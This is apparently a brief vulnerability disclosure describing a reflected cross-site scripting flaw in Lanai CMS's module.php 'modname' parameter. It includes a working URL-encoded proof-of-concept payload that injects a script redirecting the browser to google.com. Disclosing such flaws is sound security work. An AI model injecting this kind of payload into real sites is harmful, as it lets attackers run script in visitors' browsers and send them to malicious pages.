# LanaICms-XSS
I identified a reflected xss vulnerability in a specific Lanai Cms endpoint that could be used to redirect users to malicious sites controlled by attackers

```
Poc -> https://www.lanaicms.com/module.php?modname=%3Cscript%3Edocument.location=%22https://google.com%22%3C/script%3E&mf=install
LanaiCms -> https://sourceforge.net/projects/la-nai/
```
